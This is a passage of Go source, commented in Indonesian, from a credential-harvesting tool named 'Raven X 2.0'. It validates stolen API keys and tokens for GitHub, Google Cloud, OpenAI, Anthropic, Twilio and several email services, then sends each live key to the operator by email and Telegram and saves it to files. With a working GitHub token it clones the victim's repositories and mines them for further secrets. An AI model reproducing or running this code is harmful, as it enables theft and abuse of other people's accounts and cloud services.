	reqInfo.Header.Set("Authorization", "Bearer "+key)
	respInfo, err := client.Do(reqInfo)
	if err == nil && respInfo.StatusCode == 200 {
		var creditInfo map[string]interface{}
		json.NewDecoder(respInfo.Body).Decode(&creditInfo)
		respInfo.Body.Close()

		if total, ok := creditInfo["total"].(float64); ok {
			result["quota_limit"] = total
			if remaining, ok := creditInfo["remain"].(float64); ok {
				result["quota_remaining"] = remaining
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"personalizations": []map[string]interface{}{
			{
				"to": []map[string]interface{}{
					{"email": a.Config.EmailTarget},
				},
			},
		},
		"from": map[string]interface{}{
			"email": fromEmail,
			"name":  "Raven X 2.0",
		},
		"subject": "Raven X 2.0 - SendGrid Credential Test",
		"content": []map[string]interface{}{
			{
				"type":  "text/html",
				"value": fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the SendGrid credentials are working.</p>`, sourceURL, key),
			},
		},
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.sendgrid.com/v3/mail/send", bytes.NewReader(jsonData))
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 202 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMailgun mengirim email menggunakan Mailgun API
// fromEmail: email dari hasil validasi (dari domain yang tersedia)
func (a *AWSScanner) SendEmailViaMailgun(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0
	result["domains"] = []string{}

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Get domains
	reqDomains, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
	reqDomains.SetBasicAuth("api", key)
	respDomains, err := client.Do(reqDomains)
	var domain string
	if err == nil && respDomains.StatusCode == 200 {
		var domainsResp map[string]interface{}
		json.NewDecoder(respDomains.Body).Decode(&domainsResp)
		respDomains.Body.Close()

		if items, ok := domainsResp["items"].([]interface{}); ok && len(items) > 0 {
			if firstDomain, ok := items[0].(map[string]interface{}); ok {
				if name, ok := firstDomain["name"].(string); ok {
					domain = name
					domains := []string{}
					for _, item := range items {
						if d, ok := item.(map[string]interface{}); ok {
							if n, ok := d["name"].(string); ok {
								domains = append(domains, n)
							}
						}
					}
					result["domains"] = domains
				}
			}
		}
	}

	if domain == "" {
		result["error"] = "No domain found"
		return result
	}

	// Jika fromEmail tidak diberikan, gunakan domain yang ditemukan
	if fromEmail == "" {
		fromEmail = fmt.Sprintf("noreply@%s", domain)
	} else if !strings.Contains(fromEmail, "@") {
		// Jika fromEmail hanya username, tambahkan domain
		fromEmail = fmt.Sprintf("%s@%s", fromEmail, domain)
	}

	// Send email
	data := url.Values{}
	data.Set("from", fmt.Sprintf("Raven X 2.0 <%s>", fromEmail))
	data.Set("to", a.Config.EmailTarget)
	data.Set("subject", "Raven X 2.0 - Mailgun Credential Test")
	data.Set("html", fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the Mailgun credentials are working.</p>`, sourceURL, key))

	req, _ := http.NewRequest("POST", fmt.Sprintf("https://api.mailgun.net/v3/%s/messages", domain), strings.NewReader(data.Encode()))
	req.SetBasicAuth("api", key)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMandrill mengirim email menggunakan Mandrill API
// fromEmail: email dari hasil validasi (dari user info)
func (a *AWSScanner) SendEmailViaMandrill(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari user info
	if fromEmail == "" {
		payload := map[string]string{"key": key}
		jsonPayload, _ := json.Marshal(payload)
		reqInfo, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/users/info.json", bytes.NewReader(jsonPayload))
		reqInfo.Header.Set("Content-Type", "application/json")
		respInfo, err := client.Do(reqInfo)
		if err == nil && respInfo.StatusCode == 200 {
			var userInfo map[string]interface{}
			json.NewDecoder(respInfo.Body).Decode(&userInfo)
			respInfo.Body.Close()

			if username, ok := userInfo["username"].(string); ok && username != "" {
				// Mandrill menggunakan username sebagai from_email
				fromEmail = username
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"key": key,
		"message": map[string]interface{}{
			"from_email": fromEmail,
			"from_name":  "Raven X 2.0",
			"to": []map[string]interface{}{
				{"email": a.Config.EmailTarget, "type": "to"},
			},
			"subject": "Raven X 2.0 - Mandrill Credential Test",
			"html":    fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the Mandrill credentials are working.</p>`, sourceURL, key),
		},
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/messages/send.json", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var respData []interface{}
			json.NewDecoder(resp.Body).Decode(&respData)
			if len(respData) > 0 {
				if msgData, ok := respData[0].(map[string]interface{}); ok {
					if status, ok := msgData["status"].(string); ok && (status == "sent" || status == "queued") {
						result["success"] = true
					} else {
						result["error"] = fmt.Sprintf("Status: %v", status)
					}
				}
			}
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMailerSend mengirim email menggunakan MailerSend API
// fromEmail: email dari hasil validasi (dari domain yang tersedia)
func (a *AWSScanner) SendEmailViaMailerSend(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari domain yang tersedia
	if fromEmail == "" {
		reqDomains, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
		reqDomains.Header.Set("Authorization", "Bearer "+key)
		reqDomains.Header.Set("X-Requested-With", "XMLHttpRequest")
		respDomains, err := client.Do(reqDomains)
		if err == nil && respDomains.StatusCode == 200 {
			var domainsResp map[string]interface{}
			json.NewDecoder(respDomains.Body).Decode(&domainsResp)
			respDomains.Body.Close()

			if data, ok := domainsResp["data"].([]interface{}); ok && len(data) > 0 {
				if firstDomain, ok := data[0].(map[string]interface{}); ok {
					if name, ok := firstDomain["name"].(string); ok && name != "" {
						fromEmail = fmt.Sprintf("noreply@%s", name)
					}
				}
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"from": map[string]interface{}{
			"email": fromEmail,
			"name":  "Raven X 2.0",
		},
		"to": []map[string]interface{}{
			{"email": a.Config.EmailTarget},
		},
		"subject": "Raven X 2.0 - MailerSend Credential Test",
		"html":    fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the MailerSend credentials are working.</p>`, sourceURL, key),
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.mailersend.com/v1/email", bytes.NewReader(jsonData))
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 202 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

func (a *AWSScanner) checkSNSLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.SNSLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	results := make(map[string]float64)
	regions, _ := getAllRegions("sns")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		snsClient := sns.NewFromConfig(cfg)
		out, err := snsClient.GetSMSAttributes(ctx, &sns.GetSMSAttributesInput{Attributes: []string{"MonthlySpendLimit"}})
		if err != nil {
			continue
		}
		if val, ok := out.Attributes["MonthlySpendLimit"]; ok {
			limit, _ := strconv.ParseFloat(val, 64)
			if limit > 0 {
				results[region] = limit
			}
		}
	}
	return results
}

func (a *AWSScanner) checkFargateOnDemandLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.FargateLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	limits := make(map[string]float64)
	regions, _ := getAllRegions("fargate")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		client := servicequotas.NewFromConfig(cfg)
		quota, err := client.GetServiceQuota(ctx, &servicequotas.GetServiceQuotaInput{ServiceCode: aws.String("fargate"), QuotaCode: aws.String("L-F4011B99")})
		if err == nil && quota.Quota != nil && quota.Quota.Value != nil {
			limits[region] = *quota.Quota.Value
		}
	}
	return limits
}

func (a *AWSScanner) CheckGitHubToken(token, sourceURL string) bool {
	// Pengecekan fitur deep scan/validasi di sini
	// Note: APIValidation.GitHub mengontrol pengecekan dasar token
	if !a.Config.APIValidation.GitHub && !a.Config.ScanningFeatures.GitHubTokenDeepScan {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(token, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.TokensHarvested++
	globalCounters.mu.Unlock()

	pterm.Info.Printfln("[CHECK] Validating GitHub Token: %s...", token)

	req, errReq := http.NewRequest("GET", "https://api.github.com/user", nil)
	if errReq != nil {
		pterm.Debug.Printfln("[ERROR] Failed to create GitHub request: %v", errReq)
		return false
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Authorization", "token "+token)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))

	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			login, _ := res["login"].(string)

			a.logValid("GitHub Token", fmt.Sprintf("User: %s", login))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, token), "valid_github_token.txt")

			globalCounters.mu.Lock()
			globalCounters.TokensValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🐙", "GITHUB TOKEN", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nUser : %s\nToken : %s\n", login, token)
			go a.sendTelegram(msg)

			// Pengecekan Deep Scan
			if a.Config.ScanningFeatures.GitHubTokenDeepScan {
				a.ProcessGitHubToken(token)
			}
			return true
		}
	} else if os.IsTimeout(err) {
		pterm.Debug.Printfln("[TIMEOUT] GitHub validation timed out for token starting with %s", token[:8])
	}
	return false
}

func (a *AWSScanner) ProcessGitHubToken(token string) {
	// Deep scan hanya berjalan jika diaktifkan di konfigurasi
	if !a.Config.ScanningFeatures.GitHubTokenDeepScan {
		return
	}

	req, _ := http.NewRequest("GET", "https://api.github.com/user/repos?per_page=100&type=all", nil)
	req.Header.Set("Authorization", "token "+token)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var repos []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&repos)
		if len(repos) > 0 {
			pterm.Info.Printfln("[DEEP SCAN] Found %d repos for token. Cloning and scanning...", len(repos))
			var wg sync.WaitGroup
			// Batasi goroutine untuk mencegah OOM
			sem := make(chan struct{}, 50)
			for _, repo := range repos {
				wg.Add(1)
				sem <- struct{}{}
				go func(r map[string]interface{}) {
					defer wg.Done()
					defer func() { <-sem }()
					a.ScanRepo(token, r)
				}(repo)
			}
			wg.Wait()
		}
	}
}

func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
	name, _ := repo["name"].(string)
	htmlUrl, _ := repo["html_url"].(string)
	if name == "" || htmlUrl == "" {
		return
	}

	cloneUrl := strings.Replace(htmlUrl, "https://", "https://"+token+"@", 1)
	targetDir := filepath.Join(a.TempDir, name)

	os.RemoveAll(targetDir)

	// Timeout lebih pendek untuk mencegah hang
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "git", "clone", "--depth", "1", cloneUrl, targetDir)
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("Clone timeout for %s after 60s", name)
		} else {
			pterm.Debug.Printfln("Failed to clone %s: %v", name, err)
		}
		return
	}

	var deepScanWG sync.WaitGroup

	deepScanWG.Add(1)
	go func() {
		defer deepScanWG.Done()
		a.ScanRepoWithTruffleHog(targetDir, fmt.Sprintf("Repo: %s (TruffleHog)", name))
	}()

	deepScanWG.Add(1)
	go func() {
		defer deepScanWG.Done()
		a.ScanRepoWithGitleaks(targetDir, fmt.Sprintf("Repo: %s (GitLeaks)", name))
	}()

	deepScanWG.Wait()

	// Scan files dengan kontrol goroutine yang ketat
	var wg sync.WaitGroup
	fileSem := make(chan struct{}, 20) // Batasi scanning file secara bersamaan

	filepath.WalkDir(targetDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if d.Name() == ".git" {
			return fs.SkipDir
		}
		ext := strings.ToLower(filepath.Ext(path))
		if IsIgnoredExt(ext) {
			return nil
		}

		contentBytes, errRead := ioutil.ReadFile(path)
		if errRead != nil || len(contentBytes) > 1024000 {
			return nil
		}

		if bytes.Contains(contentBytes, []byte{0}) {
			return nil
		}

		wg.Add(1)
		fileSem <- struct{}{}
		go func(c, s string) {
			defer wg.Done()
			defer func() { <-fileSem }()
			a.checkAndSaveKeys(c, s)
		}(string(contentBytes), fmt.Sprintf("Repo: %s | File: %s", name, filepath.Base(path)))
		return nil
	})
	wg.Wait()
	os.RemoveAll(targetDir)
}

func (a *AWSScanner) ScanRepoWithTruffleHog(repoPath, sourceInfo string) {
	if _, err := exec.LookPath("trufflehog"); err != nil {
		pterm.Debug.Printfln("[TRUFFLEHOG] Not found. Skipping %s.", sourceInfo)
		return
	}

	pterm.Info.Printfln("[TRUFFLEHOG] Scanning %s for deep secrets...", sourceInfo)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "trufflehog", "--json", "--repo_path", repoPath)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("[TRUFFLEHOG TIMEOUT] Scan on %s timed out.", repoPath)
		} else {
			pterm.Debug.Printfln("[TRUFFLEHOG ERROR] Failed to run on %s: %v. Stderr: %s", repoPath, err, stderr.String())
		}
		return
	}

	scanner := bufio.NewScanner(&stdout)
	for scanner.Scan() {
		line := scanner.Bytes()
		var result TruffleHogResult

		if err := json.Unmarshal(line, &result); err != nil {
			pterm.Debug.Printfln("[TRUFFLEHOG PARSE ERROR] Failed to parse JSON: %v", err)
			continue
		}

		if result.Secret != "" {
			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
				continue
			}

			commitShort := result.SourceMetadata.Data.Commit
			if len(commitShort) > 8 {
				commitShort = commitShort[:8]
			}

			details := fmt.Sprintf("Detector: %s | Verified: %t | Commit: %s | File: %s",
				result.DetectorName, result.Verified, commitShort, result.SourceMetadata.Data.File)

			secretMasked := result.Secret
			if len(secretMasked) > 20 {
				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
			}
			pterm.Success.Printfln("[💣 TRUFFLEHOG VALID] Secret: %s | %s", secretMasked, details)

			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.DetectorName, result.Secret), "trufflehog_secrets.txt")

			msg := a.tgHit("🔍", "TRUFFLEHOG SECRET", sourceInfo) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nDetector : %s\nVerified : %t\nSecret : %s\nFile : %s\nCommit : %s\n",
				result.DetectorName, result.Verified, result.Secret, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
			go a.sendTelegram(msg)

			globalCounters.mu.Lock()
			globalCounters.CryptoKeysFound++
			globalCounters.mu.Unlock()
		}
	}
}

func (a *AWSScanner) ScanRepoWithGitleaks(repoPath, sourceInfo string) {
	if _, err := exec.LookPath("gitleaks"); err != nil {
		pterm.Debug.Printfln("[GITLEAKS] Not found. Skipping %s.", sourceInfo)
		return
	}

	pterm.Info.Printfln("[GITLEAKS] Scanning %s for leaks...", sourceInfo)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "gitleaks", "detect", "--repo-path", repoPath, "--report-format=json", "--exit-code=0")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("[GITLEAKS TIMEOUT] Scan on %s timed out.", repoPath)
		} else if strings.Contains(stderr.String(), "no leaks found") || strings.Contains(stdout.String(), "no leaks found") {
		} else {
		}
	}

	var results []GitleaksResult
	if err := json.Unmarshal(stdout.Bytes(), &results); err != nil {
		if len(stdout.Bytes()) > 0 {
			pterm.Debug.Printfln("[GITLEAKS PARSE ERROR] Failed to parse JSON output: %v", err)
		}
		return
	}

	for _, result := range results {
		if result.Secret != "" {
			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
				continue
			}

			commitShort := result.Commit
			if len(commitShort) > 8 {
				commitShort = commitShort[:8]
			}

			details := fmt.Sprintf("Rule: %s | Commit: %s | File: %s",
				result.RuleID, commitShort, result.File)

			secretMasked := result.Secret
			if len(secretMasked) > 20 {
				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
			}
			pterm.Success.Printfln("[💣 GITLEAKS VALID] Secret: %s | %s", secretMasked, details)

			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.RuleID, result.Secret), "gitleaks_secrets.txt")

			msg := a.tgHit("🔍", "GITLEAKS SECRET", sourceInfo) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nRule : %s\nSecret : %s\nFile : %s\nCommit : %s\n",
				result.RuleID, result.Secret, result.File, result.Commit)
			go a.sendTelegram(msg)

			globalCounters.mu.Lock()
			globalCounters.CryptoKeysFound++
			globalCounters.mu.Unlock()
		}
	}
}

// Fungsi untuk mengecek validitas GCP API Key
func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
	if !a.Config.APIValidation.GCPAPIKey { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Menggunakan Google Maps Static API endpoint check
	endpoint := fmt.Sprintf("https://maps.googleapis.com/maps/api/staticmap?center=40.714%2C-73.998&zoom=12&size=400x400&key=%s", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	req, errReq := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
	if errReq != nil {
		pterm.Debug.Printfln("[GCP ERROR] Failed to create request for %s: %v", key[:8]+"...", errReq)
		return false
	}

	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 403 {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			body := string(bodyBytes)

			if resp.StatusCode == 403 && strings.Contains(body, "API not enabled") {
				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE (API Disabled)", key))
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
				a.storeValidKeyLimit("GCP Key", key, "LIVE (API Disabled)")
			} else if resp.StatusCode == 200 || (resp.StatusCode == 400 && !strings.Contains(body, "API key not valid")) {
				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE", key))
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
				a.storeValidKeyLimit("GCP Key", key, "LIVE")
			} else {
				return false
			}

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("☁️", "GCP KEY", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 400 {
			pterm.Debug.Printfln("[GCP Key] Key %s failed validation (400).", key[:8]+"...")
		}
	}
	return false
}

// do429Retry executes req with rate-limit (HTTP 429) and transient 5xx retry handling.
//
// Behavior:
//   - On 429: parses Retry-After (integer seconds, default 2s) and sleeps that long, then retries.
//   - On >= 500: logs and retries once with a 1s sleep.
//   - Otherwise returns the response immediately.
//   - Total attempts capped at maxAttempts (defaults to 3 when <= 0).
//
// Requests are cloned via req.Clone(req.Context()) for each retry so a consumed body
// does not break replay (Go gotcha: http.Request body is a one-shot ReadCloser).
func do429Retry(client *http.Client, req *http.Request, maxAttempts int) (*http.Response, error) {
	if maxAttempts <= 0 {
		maxAttempts = 3
	}

	var lastResp *http.Response
	var lastErr error
	fiveXXRetried := false

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		// Clone for each attempt — once a request body is consumed, the original cannot be replayed.
		attemptReq := req.Clone(req.Context())

		resp, err := client.Do(attemptReq)
		lastResp, lastErr = resp, err
		if err != nil {
			return resp, err
		}

		if resp.StatusCode == 429 {
			retryAfter := 2
			if ra := resp.Header.Get("Retry-After"); ra != "" {
				if secs, perr := strconv.Atoi(strings.TrimSpace(ra)); perr == nil && secs > 0 {
					retryAfter = secs
				}
			}
			pterm.Debug.Printfln("[do429Retry] 429 received, sleeping %ds (attempt %d/%d)", retryAfter, attempt, maxAttempts)
			if attempt == maxAttempts {
				// Last attempt — hand the 429 response back to the caller (don't close the body).
				return resp, nil
			}
			resp.Body.Close()
			time.Sleep(time.Duration(retryAfter) * time.Second)
			continue
		}

		if resp.StatusCode >= 500 {
			if fiveXXRetried || attempt == maxAttempts {
				// No more retries — return the response for the caller to inspect.
				return resp, nil
			}
			pterm.Debug.Printfln("[do429Retry] %d received, retrying once after 1s (attempt %d/%d)", resp.StatusCode, attempt, maxAttempts)
			resp.Body.Close()
			fiveXXRetried = true
			time.Sleep(1 * time.Second)
			continue
		}

		return resp, nil
	}

	return lastResp, lastErr
}

// Fungsi untuk mengecek validitas OpenAI
func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
	if !a.Config.APIValidation.OpenAI && !a.Config.APIValidation.AIAll { // gate: per-vendor OR master AI toggle
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("OpenAI", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_openai.txt")
			a.storeValidKeyLimit("OpenAI", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🤖", "OPENAI KEY", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[OpenAI] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Anthropic
func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
	if !a.Config.APIValidation.Anthropic && !a.Config.APIValidation.AIAll { // gate: per-vendor OR master AI toggle
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Endpoint sederhana untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://api.anthropic.com/v1/models", nil)
	req.Header.Set("x-api-key", key)
	req.Header.Set("anthropic-version", "2023-10-01") // Versi API yang disyaratkan (next stable after 2023-06-01)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("Anthropic", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_anthropic.txt")
			a.storeValidKeyLimit("Anthropic", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🤖", "ANTHROPIC KEY", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[Anthropic] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Twilio
func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
	if !a.Config.APIValidation.Twilio { // Pengecekan fitur baru
		return false
	}

	// Tighten SID validation: must match AC + 32 lowercase hex chars exactly (Account SID format)
	// before any HTTP call is made. Cuts false-positive validation traffic from loose extractor regex.
	if !regexp.MustCompile(`^AC[a-f0-9]{32}$`).MatchString(sid) {
		return false
	}

	pair := sid + ":" + auth
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", sid), nil)
	req.SetBasicAuth(sid, auth)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			status, _ := res["status"].(string)
			friendlyName, _ := res["friendly_name"].(string)

			a.logValid("Twilio", fmt.Sprintf("SID: %s | Status: %s", sid, status))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, sid, auth), "valid_twilio.txt")
			a.storeValidKeyLimit("Twilio", sid, fmt.Sprintf("%s (%s)", friendlyName, status))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📱", "TWILIO HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nSID : %s\nAuth : %s\nStatus : %s\nName : %s\n",
				sid, auth, status, friendlyName)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas SendGrid
func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
	if !a.Config.APIValidation.SendGrid { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
	req.Header.Set("Authorization", "Bearer "+key)

